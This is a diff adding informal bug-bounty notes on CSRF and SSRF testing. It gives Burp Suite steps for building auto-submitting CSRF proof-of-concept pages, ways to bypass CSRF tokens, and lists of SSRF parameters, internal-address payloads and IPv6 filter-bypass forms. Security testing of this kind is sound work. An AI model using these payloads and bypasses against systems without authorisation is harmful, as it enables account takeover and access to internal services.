@@ -1,0 +1,109 @@
+CSRF:
+
+--> Change email id of the victim  
+--> Change password of the victim 
+--> Change username of the victim  
+--> Change payment of the victim   
+--> Change comments of the victim  
+--> Change any data of the victim  
+
+
+Normal CSRF/ out of scope: 
+--> intercept request when logout you will find cookie or etc
+--> right click > Engagement tools > genarate CSRF POC > options > include auto submit script > regenarate > copy the html code and drop the request
+--> open .html and paste the code and open with browser where login this account
+--> if you see that you are logout automitacally thats means this is CSRF
+
+Method 01:
+--> First login your account
+--> find change your email id options
+--> then you give test@test.com
+--> intercept it when update click
+--> right click > Engagement tools > genarate CSRF POC > then change test1@test.com > include auto submit script > regenarate > copy the html and drop the request
+--> open .html and paste the code and open with browser where login this account
+
+Method 02:
+--> First login your account
+--> find change your email id options
+--> then you give test@test.com
+--> intercept it when update click 
+--> try to Change post to GET if you will see 302 that means couple bit a chance
+--> right click > Engagement tools > genarate CSRF POC > then change test1@test.com > include auto submit script > regenarate > copy the html and drop the request
+--> open .html and paste the code and open with browser where login this account
+
+Tips:
+--> if you found csrf= in your request section try to remove csrf token or change some character in the token or remove csrf parameter or change http request method GET/POST/PUT/DELETE etc
+
+
+SSRF:
+
+Any Malicious request by attacker to a server by any given parameter.
+
+01. Server site attack >> admin, database
+02. Request Forgery >> url(localhost, 127.0.0.1, 192.168.0.1)  
+
+Types : Regular SSRF | blind SSRF
+Payload : http://127.0.0.1/admin         
+Tools : SSRFmaps, Gopherus, See-SURF, SSRF=Sheriff,surf, ipfuscator 
+
+Parameter:
+
+dest=
+php_info=
+callback=
+id=
+file=
+page=
+url=
+uri=
+
+Payload:
+
+http://localhost:80  
+http://localhost:443
+http://localhost:22
+
+http://127.0.0.1:80  
+http://127.0.0.1:443
+http://127.0.0.1:22
+
+http://0.0.0.0:80  
+http://0.0.0.0:443
+http://0.0.0.0:22
+
+192.168.0.X
+
+Bypass Filters:
+
+http://127.0.0.1/
+http://localhost/
+
+http:[::]:80/
+http:[::]:25/
+http:[::]:22/
+http:[::]:3128/
+               
+http:[0000::1]:80/
+http:[0000::1]:25/
+http:[0000::1]:22/
+http:[0000::1]:3128/  
+                                                                   
+Reference : Payloadallthings SSRF    
+
+Method:
+--> You must find a link and encoded link that called from another
+--> Right click > extention > burp bounty pro > Active Scan > SSRF 
+--> Then you must send to repeater and try to payloads 
+--> if you see that something is happening that means here is SSRF 
+
+Tips : Try SSRF where is link    
+
+For Own Server : Burp Collaborator, pipedream           
+
+
+
+
+
+
+
+
